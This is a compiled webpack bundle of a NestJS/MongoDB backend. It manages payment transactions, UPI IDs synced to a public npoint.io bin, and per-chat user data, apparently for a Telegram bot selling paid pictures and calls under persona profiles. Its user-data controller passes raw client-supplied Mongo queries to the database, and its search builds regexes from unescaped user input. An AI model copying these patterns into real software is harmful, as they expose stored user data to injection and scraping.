            mongoose_1.MongooseModule.forFeature([
                { name: transaction_schema_1.Transaction.name, schema: transaction_schema_1.TransactionSchema },
            ]),
        ],
        controllers: [transaction_controller_1.TransactionController],
        providers: [transaction_service_1.TransactionService],
        exports: [transaction_service_1.TransactionService]
    })
], TransactionModule);


/***/ }),

/***/ "./src/components/transactions/transaction.service.ts":
/*!************************************************************!*\
  !*** ./src/components/transactions/transaction.service.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
let TransactionService = class TransactionService {
    constructor(transactionModel) {
        this.transactionModel = transactionModel;
    }
    async create(createTransactionDto) {
        const newTransaction = new this.transactionModel(createTransactionDto);
        return await newTransaction.save();
    }
    async findOne(id) {
        const transaction = await this.transactionModel.findById(id).exec();
        if (!transaction) {
            throw new common_1.NotFoundException('Transaction not found');
        }
        return transaction;
    }
    async findAll(search, limit = 10, offset = 0) {
        const query = search
            ? {
                $or: [
                    { transactionId: { $regex: search, $options: 'i' } },
                    { issue: { $regex: search, $options: 'i' } },
                    { profile: { $regex: search, $options: 'i' } },
                    { chatId: { $regex: search, $options: 'i' } },
                ],
            }
            : {};
        const transactions = await this.transactionModel
            .find(query)
            .skip(offset)
            .limit(limit)
            .exec();
        const total = await this.transactionModel.countDocuments(query).exec();
        return { transactions, total };
    }
    async update(id, updateTransactionDto) {
        const updatedTransaction = await this.transactionModel
            .findByIdAndUpdate(id, updateTransactionDto, { new: true })
            .exec();
        if (!updatedTransaction) {
            throw new common_1.NotFoundException('Transaction not found');
        }
        return updatedTransaction;
    }
    async delete(id) {
        const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();
        if (!deletedTransaction) {
            throw new common_1.NotFoundException('Transaction not found');
        }
        return deletedTransaction;
    }
};
exports.TransactionService = TransactionService;
exports.TransactionService = TransactionService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(transaction_schema_1.Transaction.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], TransactionService);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.controller.ts":
/*!******************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.controller.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const upi_ids_service_1 = __webpack_require__(/*! ./upi-ids.service */ "./src/components/upi-ids/upi-ids.service.ts");
let UpiIdController = class UpiIdController {
    constructor(UpiIdService) {
        this.UpiIdService = UpiIdService;
    }
    async findOne() {
        return this.UpiIdService.findOne();
    }
    async update(updateUpiIdsdto) {
        return this.UpiIdService.update(updateUpiIdsdto);
    }
};
exports.UpiIdController = UpiIdController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get Upi Ids' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UpiIdController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update Upi Ids' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UpiIdController.prototype, "update", null);
exports.UpiIdController = UpiIdController = __decorate([
    (0, swagger_1.ApiTags)('UPI Ids'),
    (0, common_1.Controller)('upi-ids'),
    __metadata("design:paramtypes", [upi_ids_service_1.UpiIdService])
], UpiIdController);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.module.ts":
/*!**************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.module.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const upi_ids_service_1 = __webpack_require__(/*! ./upi-ids.service */ "./src/components/upi-ids/upi-ids.service.ts");
const upi_ids_controller_1 = __webpack_require__(/*! ./upi-ids.controller */ "./src/components/upi-ids/upi-ids.controller.ts");
const upi_ids_schema_1 = __webpack_require__(/*! ./upi-ids.schema */ "./src/components/upi-ids/upi-ids.schema.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
let UpiIdModule = class UpiIdModule {
};
exports.UpiIdModule = UpiIdModule;
exports.UpiIdModule = UpiIdModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            UpiIdModule,
            npoint_module_1.NpointModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: upi_ids_schema_1.UpiIdSchema }]),
        ],
        providers: [upi_ids_service_1.UpiIdService],
        controllers: [upi_ids_controller_1.UpiIdController],
        exports: [upi_ids_service_1.UpiIdService],
    })
], UpiIdModule);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.schema.ts":
/*!**************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.schema.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdSchema = exports.UpiId = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let UpiId = class UpiId {
};
exports.UpiId = UpiId;
exports.UpiId = UpiId = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], UpiId);
exports.UpiIdSchema = mongoose_1.SchemaFactory.createForClass(UpiId);
exports.UpiIdSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.service.ts":
/*!***************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.service.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
let UpiIdService = class UpiIdService {
    constructor(UpiIdModel, npointSerive) {
        this.UpiIdModel = UpiIdModel;
        this.npointSerive = npointSerive;
        this.upiIds = {};
        this.UpiIdModel.findOne({}).exec().then((data) => {
            this.upiIds = data;
            console.log("Refreshed UPIs");
        });
        setInterval(async () => {
            await this.refreshUPIs();
            await this.checkNpoint();
        }, 5 * 60 * 1000);
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async refreshUPIs() {
        console.log("Refreshed UPIs");
        this.upiIds = await this.UpiIdModel.findOne({}).exec();
    }
    async checkNpoint() {
        const upiIds = (await axios_1.default.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;
        const existingUpiIds = await this.findOne();
        if ((0, utils_1.areJsonsNotSame)(upiIds, existingUpiIds)) {
            await this.npointSerive.updateDocument("54baf762fd873c55c6b1", this.upiIds);
        }
    }
    async findOne() {
        if (Object.keys(this.upiIds).length > 0) {
            return this.upiIds;
        }
        const result = await this.UpiIdModel.findOne({}).exec();
        this.upiIds = result;
        console.log("Refreshed UPIs");
        return result;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.UpiIdModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true }).exec();
        this.upiIds = updatedUser;
        console.log("Refreshed UPIs");
        if (!updatedUser) {
            throw new common_1.NotFoundException(`UpiIdModel not found`);
        }
        return updatedUser;
    }
};
exports.UpiIdService = UpiIdService;
exports.UpiIdService = UpiIdService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('UpiIdModule')),
    __metadata("design:paramtypes", [mongoose_2.Model,
        npoint_service_1.NpointService])
], UpiIdService);


/***/ }),

/***/ "./src/components/user-data/dto/create-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/create-user-data.dto.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateUserDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateUserDataDto {
}
exports.CreateUserDataDto = CreateUserDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '5787751360', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1, description: 'Total count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Picture count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "picCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1718802722566, description: 'Last message timestamp' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1718802742567, description: 'Limit time' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "limitTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Paid count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "paidCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Profile count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "prfCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1, description: 'Can reply' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "canReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Pay amount' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'highestPayAmount' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "highestPayAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'cheatCount', default: 0 }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "cheatCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'callTime', default: 0 }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "callTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '-7250939091939055173', description: 'Access hash' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "accessHash", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid reply status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Demo given status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second show status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'sneha', description: 'Profile name' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Pics Sent status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "picsSent", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: [], description: 'videos' }),
    __metadata("design:type", Array)
], CreateUserDataDto.prototype, "videos", void 0);


/***/ }),

/***/ "./src/components/user-data/dto/search-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/search-user-data.dto.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
class SearchDto {
}
exports.SearchDto = SearchDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Total count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Picture count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "picCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Last message timestamp', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Limit time', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "limitTime", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paid count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "paidCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "prfCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Can reply', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "canReply", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Pay amount', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Username' }),
    __metadata("design:type", String)
], SearchDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Access hash' }),
    __metadata("design:type", String)
], SearchDto.prototype, "accessHash", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paid reply status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Demo given status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Second show status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile name' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    __metadata("design:type", String)
], SearchDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Chat ID' }),
    __metadata("design:type", String)
], SearchDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Pics Sent status' }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "picsSent", void 0);


/***/ }),

/***/ "./src/components/user-data/dto/update-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/update-user-data.dto.ts ***!
  \**************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUserDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_user_data_dto_1 = __webpack_require__(/*! ./create-user-data.dto */ "./src/components/user-data/dto/create-user-data.dto.ts");
class UpdateUserDataDto extends (0, swagger_1.PartialType)(create_user_data_dto_1.CreateUserDataDto) {
}
exports.UpdateUserDataDto = UpdateUserDataDto;


/***/ }),

/***/ "./src/components/user-data/schemas/user-data.schema.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/schemas/user-data.schema.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataSchema = exports.UserData = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let UserData = class UserData {
};
exports.UserData = UserData;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "chatId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "totalCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "picCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "limitTime", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "paidCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "prfCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "canReply", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "payAmount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "username", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "accessHash", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "paidReply", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "demoGiven", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "secondShow", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, default: 0 }),
    __metadata("design:type", Number)
], UserData.prototype, "fullShow", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "profile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "picSent", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "highestPayAmount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "cheatCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "callTime", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: [] }),
    __metadata("design:type", Array)
], UserData.prototype, "videos", void 0);
exports.UserData = UserData = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], UserData);
exports.UserDataSchema = mongoose_1.SchemaFactory.createForClass(UserData);


/***/ }),

/***/ "./src/components/user-data/user-data.controller.ts":
/*!**********************************************************!*\
  !*** ./src/components/user-data/user-data.controller.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const user_data_service_1 = __webpack_require__(/*! ./user-data.service */ "./src/components/user-data/user-data.service.ts");
const create_user_data_dto_1 = __webpack_require__(/*! ./dto/create-user-data.dto */ "./src/components/user-data/dto/create-user-data.dto.ts");
const search_user_data_dto_1 = __webpack_require__(/*! ./dto/search-user-data.dto */ "./src/components/user-data/dto/search-user-data.dto.ts");
const update_user_data_dto_1 = __webpack_require__(/*! ./dto/update-user-data.dto */ "./src/components/user-data/dto/update-user-data.dto.ts");
let UserDataController = class UserDataController {
    constructor(userDataService) {
        this.userDataService = userDataService;
    }
    async create(createUserDataDto) {
        return this.userDataService.create(createUserDataDto);
    }
    async search(query) {
        return this.userDataService.search(query);
    }
    async findAll() {
        return this.userDataService.findAll();
    }
    async updateAll(chatId, updateUserDataDto) {
        return this.userDataService.updateAll(chatId, updateUserDataDto);
    }
    async findOne(profile, chatId) {
        return this.userDataService.findOne(profile, chatId);
    }
    async update(profile, chatId, updateUserDataDto) {
        return this.userDataService.update(profile, chatId, updateUserDataDto);
    }
    async remove(profile, chatId) {
        return this.userDataService.remove(profile, chatId);
    }
    clearCount(chatId) {
        return this.userDataService.clearCount(chatId);
    }
    async executeQuery(requestBody) {
        try {
            const { query, sort, limit, skip } = requestBody;
            return await this.userDataService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.UserDataController = UserDataController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_user_data_dto_1.CreateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_user_data_dto_1.SearchDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "findAll", null);
__decorate([
    (0, common_1.Patch)('updateAll/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_user_data_dto_1.UpdateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "updateAll", null);
__decorate([
    (0, common_1.Get)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
